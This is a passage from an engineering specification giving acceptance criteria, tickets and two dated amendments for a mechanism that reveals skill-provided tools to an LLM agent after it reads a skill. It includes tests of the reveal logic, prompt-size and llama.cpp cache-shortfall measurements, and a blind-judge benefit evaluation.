- **AC-N2 — each "Not for…" line names something real.** For every skill, and every skill-provided tool description, the validator checks that a "Not for…" line exists and that each skill or tool it names exists. *Fails if* a seeded line that names a missing skill passes. This is structural. AC-F4 measures the routing. (T-C2)
- **AC-R1 — the primary sees a skill-provided tool only after the reveal.** A captured first primary request holds neither `search_logs` nor `measure_model_latency`. A captured `general` worker request holds both. The FRE-1537 capture helper selects only primary requests today (`scripts/eval/fre1537/capture.py:81`), so T-C2 adds the worker capture. *Fails if* either capture differs. (T-C2)
- **AC-R2 — the reveal works across turns, restarts and modes.** Executor and service tests, each of which can fail. *Fails if* any case differs. (T-C1)
  - A call to a skill-provided tool before any reveal is refused with the D6 error that lists its provider skills. No approval card appears, and the loop gate count does not change.
  - A call in the same model response as the revealing `read_skill` is refused the same way.
  - A call in the next round after the reveal runs.
  - In a second user turn of the same session, the tool is available without a new `read_skill`. The same holds in a new gateway process that reads the session from Postgres.
  - After a change to a mode that does not allow the tool, the tool is absent and a call to it is refused, although the session record still names it.
  - A PATCH of the session cannot set or clear `revealed_tools`, and a PATCH of `metadata` during a reveal leaves the record as it is.
  - Two reveals of different tools in two concurrent turns of one session both persist.
  - A failed load of the record gives an empty set and a log event, and the turn runs.
  - A load or an add with the wrong `user_id` reads or changes nothing. An add that matches no row or raises keeps the reveal for the current turn and logs the failure.
  - Pruning a session clears `revealed_tools`.
- **AC-R4 — the cache-safe form puts the schema where A5.8 says.** Structural tests, required only if T-B chooses the cache-safe form. *Fails if* any case differs. (T-C1)
  - The successful `read_skill` result of a providing skill holds the schemas of its tools.
  - The reveal turn's existing `<turn_context>` block holds no schema.
  - Each later turn's block holds the schema of each revealed tool once.
  - The `tools` array is the same before and after the reveal.
  - A mid-turn compression keeps the `read_skill` result that holds the schema (D2.4).
  - A service test runs three turns of one session and reads `sessions.messages`. Each persisted user message equals the text that was sent, and holds neither `<turn_context>` nor a schema. After a new gateway process loads the session, the outgoing request holds exactly one copy of each revealed schema.
- **AC-R3 — the provider rules hold.** The validator fails on each seeded case. *Fails if* any seeded case passes. (T-C1 for the mechanism, T-C2 for the real skills)
  - a `provides-tools` value that names an unknown tool, or a tool that is not skill-provided;
  - a skill-provided tool that no skill provides;
  - a skill that a principal cannot see (filtered by `requires-tools`, D9.1) does not reveal its tools to that principal.
- **AC-F1 — the prompt is smaller by about the tool definition.** Three request bodies, each hashed:
  - `B`: the first primary request captured at the commit before T-C2;
  - `B-minus`: `B` with only the one `query_telemetry` definition removed, byte for byte the same otherwise;
  - `A`: the first primary request captured at the commit after T-C2, for the same scenario and settings.

  Each body is sent to the production primary with an empty cache. Its token count is `cache_n + prompt_n` from the llama.cpp timings, and `cache_n` must be 0. The test requires `tokens(B) > tokens(B-minus)`, and then `tokens(B) - tokens(A) >= 0.8 × (tokens(B) - tokens(B-minus))`. The 20% margin covers the catalog lines that A4 adds (about 100 tokens against about 870, S2). *Fails if* a body, the model or the chat template differs in any way other than these, or the drop is below 80%. (T-D1)
- **AC-F2 — the full tool loop works after a reveal.** The population is 4 prompts (2 for `log-search`, 2 for `model-latency`) × 3 draws = 12, for each form and each provider. A draw counts only if all five steps hold:
  1. the model loads the skill;
  2. it emits the revealed call with valid arguments;
  3. the call is authorized and runs;
  4. its result goes back to the model;
  5. the provider accepts that request: it answers with HTTP 200, the response parses, and it holds non-empty text or a well-formed tool call. No judge is needed.

  *Fails if* fewer than 10 of 12 draws hold on the production primary. That is the floor of the skills that continue in FRE-1590 Part 1. The cloud primary is measured and reported, with no bound, because the production primary is local (`config/model_roles.yaml:55`). (T-B for the choice, T-D1 on the final build)
- **AC-F3 — the cache cost is bounded on the production primary.** In llama.cpp timings, `cache_n` is the prompt tokens reused from the cache and `prompt_n` is the prompt tokens evaluated again, so a call's whole prompt is `cache_n + prompt_n` (`scripts/eval/fre1537/replay.py:192-236`). The **shortfall** of a call is `(cache_n + prompt_n of the previous call) - cache_n of this call`. A control session sends a request sequence that is byte for byte the same as the treatment's, except for the reveal under test: the synthetic `read_skill` result is the same, and only the reveal (the schema or the `tools` change) is left out. Each arm starts with a unique nonce, so neither arm reuses the other's cache. Its shortfall at the same step is the boundary cost of the chat template. A call whose `cache_n` is larger than `cache_n + prompt_n` of the previous call breaks the lineage, as the replay already checks (`replay.py:211-236`), and voids the pair. **Amended twice on 2026-10-12 (FRE-1594):** the shortfall is `max(0, cache_n + prompt_n of the previous call - cache_n of this call)`, so reuse of generated tokens counts as 0. A pair is void only if `cache_n` is larger than the previous call's whole context, `cache_n + prompt_n + predicted_n`. A pair in which neither arm reused a token is not scored. See the two amendments in Status Updates. *Fails if* the chosen form exceeds its bound, or a call has no timings. (T-B, T-D1)
  - In the cache-safe form, the shortfall of the call after the reveal is no larger than the control's shortfall at the same step.
  - In the simple form, a session has at most one call for each revealed tool whose shortfall is larger than the control's at the same step.
  - For the cloud primary, T-B reports `cache_read_tokens` (`llm_client/telemetry.py:127`) for each form, with no bound.
- **AC-F4 — the skills are chosen, and they help.** *Fails if* any bound is missed.
  - **Routing (T-D1, Part 1 with the second step).** Each of the seven skills in A4 is the first call on at least 10 of 12 draws (4 scenarios × 3 draws). No skill of the area loads where another skill of the area was expected. 0 of 60 skill loads on the no-skill prompts.
  - **Benefit (T-D2, Part 2).** A fresh A/B on the pinned scenarios. The control arm is today's design: the tools are visible and no skill is loaded. Two judges, blind to the arm, label each reply PASS, PARTIAL or FAIL against the scenario's `expect` text, as FRE-1590 F3 did. PASS is 2 points, PARTIAL 1 and FAIL 0. An arm's score on a scenario is the sum of both judges' points. When the two judges give one reply PASS and FAIL, a third judge, also blind, labels it and replaces the lower label. With skills, each area scenario scores at least what it scores in the control arm. Today `turn-forensics` #1 scores FAIL with the skill and PARTIAL without it.

#### Tickets

| Ticket | Delivers | Blocked by |
|---|---|---|
| T-A | A1: the move to `skills/`, every path in A1.3, the live documents, and the CI check for the old path (AC-L1, AC-L2) | — |
| T-B | The reveal spike, self-contained. It uses a synthetic `read_skill` result, the two experimental tool definitions and an authorization shim. It does not depend on T-C1 or T-C2. It runs the full five-step loop on the production primary and on one cloud primary, for both forms. Its report names the form for each dialect, or W3, and it is the specification input of T-C1 (AC-F2, AC-F3 on the spike) | — |
| T-C1 | A5.3–A5.6 and A5.8: the reveal mechanism, the `revealed_tools` column and its migration, and the form that T-B chose, tested with a test tool. No production tool is skill-provided yet (AC-R2, AC-R3 for the mechanism, AC-R4) | T-A, T-B |
| T-C2 | A3, A4, A5.1, A5.2 and A5.10: the tool split, the governance rows, the renames and splits of the skills, `provides-tools` on the new skills, the validator rules, the rewritten `evals.yaml` files, and the A4.4 fixes. The two tools become skill-provided in this ticket, together with the skills that provide them, so the primary never loses telemetry between tickets (AC-N1, AC-N2, AC-R1, AC-R3 for the real skills) | T-A, T-C1 |
| T-D1 | The routing run: Part 1 with the second step (AC-F1, AC-F2 on the final build, AC-F3, AC-F4 routing) | T-C2 |
| T-D2 | The benefit run: Part 2 with two blind judges (AC-F4 benefit) | T-D1 |

**Who provides what.**
- Master provisions the eval stack, the production primary's llama.cpp window and the cloud credentials for T-B, T-D1 and T-D2. The owner OKs each run on its preflight numbers.
- The seat that runs T-D2 names the two judges and their prompts in its preflight.

A2 needs no ticket now. A2.2 (the load check) is an obligation of the ticket that creates the first `agents/` file.

If T-B chooses W3, T-C1 and T-C2 are replaced by a W3 ticket with the four Codex conditions as its criteria. That ticket is filed then, not now.

#### Codex review rounds

Logged in the PR description.

### 2026-10-12 - Amendment to AC-F3: the shortfall baseline on a hybrid primary (FRE-1594)
**Changed By:** Owner (decision), `build2` seat (finding), `master` (recorded)
**Reason:** the production primary, Flash-Next, is a hybrid model (Gated DeltaNet). The llama.cpp server README and `tools/server/server-context.cpp` show that such a model cannot cut its recurrent state back to a shorter common prefix. The server does one of three things:
- It continues from the live end state, which holds the generated tokens of the previous call.
- It restores a context checkpoint, made at the last user message or near the prompt end.
- It processes the whole prompt again.

On the first path, `cache_n` includes the generated tokens, so it is larger than `cache_n + prompt_n` of the previous call. The AC-F3 lineage rule then voids the normal case.

**Owner decision (2026-10-12, in the FRE-1594 build seat):** change the baseline.

**The rule, replacing the AC-F3 shortfall and lineage sentences:**
- The shortfall of a call is `(cache_n + prompt_n + predicted_n of the previous call) - cache_n of this call`.
- A pair is void if a call's `cache_n` is larger than that whole previous context, or if the provider rejected one of its calls.
- A pair in which neither arm reused a token is not scored. A form whose only pairs at its scored steps are of this kind is `uninformative`, not a pass.
- The bounds of the cache-safe and simple forms do not change.

Implemented in `scripts/eval/fre1594/score.py` (PR #1270).

### 2026-10-12 - Second amendment to AC-F3: the shortfall counts the previous prompt only (FRE-1594)
**Changed By:** Owner (decision), `build2` seat (finding), `master` (recorded)
**Reason:** the T-B dry draw (2026-10-12, 15:08:27–15:13:19Z) showed that the whole-context baseline of the first amendment is unfair to the control. The control sends the treatment's requests, so its call 2 carries the treatment's call-1 reply, not its own. The control can never continue from its live end state. It restores the checkpoint near the end of the previous prompt. The treatment continues from its own end state. The whole-context baseline therefore charged the control for generated tokens that it never had. In the dry draw, the cache-safe treatment at call 2 had a shortfall of 1 token, and the control had 108. The llama.cpp verbose log confirmed it: each control call 2 and 3 restored a checkpoint 4 tokens before the end of its previous prompt (tasks 160, 1038 and 1219). Each treatment call that followed its own reply continued from the live state.

**Owner decision (2026-10-12, to master: "yes"):** count only the loss of the previous prompt.

**The rule, replacing the shortfall line of the first amendment:**
- The shortfall of a call is `max(0, cache_n + prompt_n of the previous call - cache_n of this call)`. Reuse of generated tokens counts as 0, not as void.
- A pair is void if a call's `cache_n` is larger than the previous call's whole context, `cache_n + prompt_n + predicted_n`, or if the provider rejected one of its calls.
- The no-reuse rule and the form bounds of the first amendment do not change.

On the dry-draw timings, the cache-safe form at call 2 is 0 (treatment) against 4 (control). The simple form is 10,862 against 4 at call 2 (the `tools` change forces a full re-processing) and 0 against 4 at call 3.

Implemented in `scripts/eval/fre1594/score.py` (PR #1270).
